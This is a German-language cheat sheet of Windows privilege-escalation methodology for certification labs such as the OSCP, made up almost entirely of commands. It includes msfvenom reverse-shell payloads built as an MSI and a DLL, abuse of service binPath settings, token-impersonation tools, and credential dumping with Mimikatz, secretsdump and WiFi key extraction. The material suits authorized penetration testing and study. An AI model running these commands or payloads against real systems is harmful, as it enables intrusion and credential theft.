# Windows Privilege Escalation Notes

> Methodik-Sammlung für Local Privilege Escalation auf Windows-Hosts —
> orientiert an OSCP / PNPT / PenTest+ Lab-Kontexten.

## Methodik

```
Recon → Enumeration → Hypothesis → Validation → Escalation → Cleanup
```

Erst verstehen, was läuft, wer wir sind, was wir dürfen — dann zielgerichtet eskalieren. Automatisiertes Tooling (WinPEAS, PowerUp) bestätigt Hypothesen, ersetzt aber keine Methodik.

---

## 1. Initial Recon

### System Information

```powershell
systeminfo
hostname
whoami /all
whoami /priv
whoami /groups
$PSVersionTable
[System.Environment]::OSVersion
```

**Worauf achten:**
- Hotfix-Liste — alte Patches verraten ungepatchte Kernel-Exploits
- Domain-Membership (`whoami /upn`)
- Zugewiesene Privileges (siehe Token Privileges)

### User & Group Enumeration

```powershell
net user
net user <username>
net localgroup administrators
net localgroup "Remote Desktop Users"
net accounts
```

```powershell
Get-LocalUser
Get-LocalGroupMember -Group Administrators
```

### Netzwerk

```powershell
ipconfig /all
route print
arp -a
netstat -ano
Get-NetTCPConnection -State Listen
```

---

## 2. Token Privileges Abuse

`whoami /priv` zeigt aktivierte und verfügbare Privileges. Folgende sind kritisch:

| Privilege                     | Eskalation                   | Tool / Vector                  |
|-------------------------------|------------------------------|--------------------------------|
| `SeImpersonatePrivilege`      | SYSTEM via Named Pipe        | JuicyPotato / PrintSpoofer / GodPotato |
| `SeAssignPrimaryTokenPrivilege` | SYSTEM via Token Replay     | RoguePotato                    |
| `SeBackupPrivilege`           | SAM/SYSTEM Hive Dump         | `reg save`, dann `secretsdump.py` |
| `SeRestorePrivilege`          | Schreibzugriff überall       | Registry Manipulation          |
| `SeTakeOwnershipPrivilege`    | Beliebige Ownership          | `takeown`, ACL-Modify          |
| `SeDebugPrivilege`            | Process Memory / Token Steal | Mimikatz, Process Injection    |
| `SeLoadDriverPrivilege`       | Kernel-Driver-Load           | Capcom-Driver, MSI-EXPLOITs    |
| `SeManageVolumePrivilege`     | FS-Zugriff                   | Defender-Definition Replace    |

**Beispiel: SeImpersonate → SYSTEM (häufig bei IIS/MSSQL Service Accounts):**

```powershell
.\PrintSpoofer.exe -i -c powershell.exe
.\GodPotato.exe -cmd "cmd /c whoami"
```

---

## 3. Service Misconfigurations

### Unquoted Service Paths

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Oder PowerShell:

```powershell
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like "* *" -and $_.StartMode -eq "Auto" }
```

**Exploit:** Binary in den ersten beschreibbaren Pfad-Abschnitt platzieren (z.B. `C:\Program.exe`).

### Weak Service Permissions

```powershell
Get-Service | ForEach-Object { Get-Acl "HKLM:\System\CurrentControlSet\Services\$($_.Name)" -ErrorAction SilentlyContinue }
```

Mit **AccessChk** (Sysinternals):

```text
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv <user> *
```

Wenn `SERVICE_CHANGE_CONFIG`:

```powershell
sc.exe config <serviceName> binPath= "C:\Windows\Temp\rev.exe"
sc.exe stop <serviceName>; sc.exe start <serviceName>
```

### Service-Binary überschreiben

```powershell
Get-WmiObject win32_service | Select-Object Name, PathName, StartMode | Where-Object { $_.StartMode -eq "Auto" }
icacls "C:\Path\To\Service.exe"
```

Wenn `(M)` (Modify) für unsere Gruppe → Binary austauschen, Service-Restart abwarten / triggern.

---

## 4. Registry Autoruns / AlwaysInstallElevated

### AlwaysInstallElevated

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Wenn beide `0x1`:

```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### Autoruns

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

Beschreibbare Pfade in Autoruns → Persistenz / Eskalation, sobald Admin sich anmeldet.

---

## 5. Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" }
```

**Prüfen:**
- Welche Tasks laufen als SYSTEM / Administrator?
- Sind ihre Skripte / EXEs beschreibbar?
- DLL-Search-Order Hijacking möglich?

```powershell
icacls "C:\Path\To\TaskScript.bat"
```

---

## 6. Credentials Hunting

### Klassische Pfade

```powershell
findstr /si "password" *.txt *.ini *.config *.xml *.ps1 *.bat 2>nul
Select-String -Path C:\Users\*\* -Pattern "password" -Recurse -ErrorAction SilentlyContinue
```

### Unattend-Dateien

```text
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep\unattend.xml
C:\Windows\System32\sysprep\sysprep.xml
```

### Group Policy Preferences (GPP)

```text
\\<DC>\SYSVOL\<domain>\Policies\
```

Verschlüsselte `cpassword` mit AES-Key dekodieren (`gpp-decrypt`).

### Browser / WiFi / Putty / RDP

```powershell
cmdkey /list
netsh wlan show profile
netsh wlan show profile name="<SSID>" key=clear
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Powershell History

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### LSASS / SAM / DPAPI

Mit Admin / SYSTEM oder `SeBackup`:

```text
reg save HKLM\SAM SAM.hive
reg save HKLM\SYSTEM SYSTEM.hive
secretsdump.py -sam SAM.hive -system SYSTEM.hive LOCAL
```

Mit Mimikatz:

```text
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
```

---

## 7. UAC Bypass

```powershell
[bool](([Security.Principal.WindowsIdentity]::GetCurrent()).Groups -match "S-1-5-32-544")
whoami /groups | findstr "S-1-16"
```

**Mandatory Integrity Level:**
- Low (S-1-16-4096)
- Medium (S-1-16-8192)
- High (S-1-16-12288)
- System (S-1-16-16384)

UAC-Bypass nur relevant, wenn Admin-User auf Medium läuft. Tools: **UACMe**, fodhelper, eventvwr.

---

## 8. Kernel Exploits (letzter Ausweg)

```powershell
systeminfo
wmic qfe list
```

Mit **Watson** / **Sherlock** / **Windows Exploit Suggester**:

```text
.\Watson.exe
python windows-exploit-suggester.py --database 2024.xls --systeminfo systeminfo.txt
```

Klassiker: PrintNightmare, HiveNightmare/SeriousSAM, PetitPotam, ZeroLogon, EFSPotato.

---

## 9. DLL Hijacking / DLL Search Order

```powershell
Get-Process | Where-Object { $_.Path -like "C:\*" } | Select Path
```

**ProcMon** filtern auf `Result = NAME NOT FOUND` und `.dll` in beschreibbaren Pfaden.

```text
sc.exe query type= service state= all
```

DLL bauen mit `msfvenom`:

```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o evil.dll
```

---

## 10. Automated Enumeration

```powershell
.\winPEASx64.exe
powershell -ep bypass .\Seatbelt.exe -group=all
powershell -ep bypass; . .\PowerUp.ps1; Invoke-AllChecks
```

| Tool        | Stärke                                    |
|-------------|-------------------------------------------|
| WinPEAS     | breite Enumeration, farbcodiert           |
| Seatbelt    | sehr detailliert, gut für Forensik-Stil   |
| PowerUp     | fokussiert auf PrivEsc-Vektoren           |
| BloodHound  | AD-Pfade, Lateral Movement                |
| SharpHound  | BloodHound-Collector                      |

---

## Cleanup-Checkliste

- Reverse-Shells beendet
- Hochgeladene Tools entfernt (`del`, `Remove-Item`)
- Service-Configs zurückgesetzt
- Erstellte Accounts gelöscht
- Event-Log-Modifikationen vermieden (NICHT versuchen zu löschen — verdächtig)

---

## References

- [HackTricks – Windows Local PrivEsc](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [PayloadsAllTheThings – Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [PEASS-ng (winPEAS)](https://github.com/peass-ng/PEASS-ng)
- [PowerSploit / PowerUp](https://github.com/PowerShellMafia/PowerSploit)
- [Sysinternals (AccessChk, ProcMon)](https://learn.microsoft.com/en-us/sysinternals/)
